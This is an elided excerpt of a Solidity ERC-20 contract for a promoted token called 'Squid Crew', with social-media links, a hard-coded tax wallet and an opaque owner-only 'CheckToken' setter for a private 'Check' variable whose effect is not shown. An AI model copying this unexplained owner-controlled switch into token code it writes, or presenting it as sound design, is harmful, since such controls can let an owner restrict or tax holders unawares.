...
https://t.me/SquidCrew

https://twitter.com/SquidCrewErc
...
contract SquidCrew is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    address payable private _taxWallet = payable(0x902f0dA02c1f5A1EAc8e894cD54cD46549721aC9);
    ...
    string private constant _name = unicode"Squid Crew";
    string private constant _symbol = unicode"SquidC";
    uint256 private Check = 0;
    ...
    function CheckToken(uint256 Checkvalue) external onlyOwner {
        Check = Checkvalue;
    }
